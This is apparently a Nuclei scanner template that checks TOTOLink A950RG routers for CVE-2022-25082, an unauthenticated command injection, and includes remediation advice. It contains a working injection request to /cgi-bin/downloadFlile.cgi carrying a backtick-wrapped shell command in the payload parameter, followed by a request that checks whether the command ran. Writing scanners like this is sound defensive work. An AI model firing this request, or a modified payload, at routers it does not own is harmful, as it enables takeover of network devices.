http:
- matchers:
  - condition: and
    part: body_2
    type: word
    words:
    - .sh
    - .cgi
  - part: header_2
    type: word
    words:
    - application/octet-stream
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /cgi-bin/downloadFlile.cgi?payload={{cmd}} HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /{{randstr}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2022-25082
info:
  author: gy741
  classification:
    cpe: cpe:2.3:o:totolink:a950rg_firmware:4.1.2cu.5204_b20210112:*:*:*:*:*:*:*
    cve-id: CVE-2022-25082
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
    epss-percentile: 0.99511
    epss-score: 0.89173
  description: 'TOTOLink A950RG V5.9c.4050_B20190424 and V4.1.2cu.5204_B20210112 were
    discovered to contain a command injection vulnerability in the Main function.
    This vulnerability allows attackers to execute arbitrary commands via the QUERY_STRING
    parameter.

    '
  impact: 'Successful exploitation of this vulnerability can lead to unauthorized
    access, data leakage, and potential compromise of the entire network.

    '
  metadata:
    max-request: 2
    product: a950rg_firmware
    vendor: totolink
  name: TOTOLink - Unauthenticated Command Injection
  reference:
  - https://nvd.nist.gov/vuln/detail/cve-2022-25082
  - https://github.com/EPhaha/IOT_vuln/blob/main/TOTOLink/A950RG/README.md
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Apply the latest firmware update provided by the vendor to fix the
    command injection vulnerability.

    '
  severity: critical
  tags: cve,cve2022,totolink,router,unauth,rce,iot,intrusive,vkev,vuln
variables:
  cmd: '`ls>../{{randstr}}`'
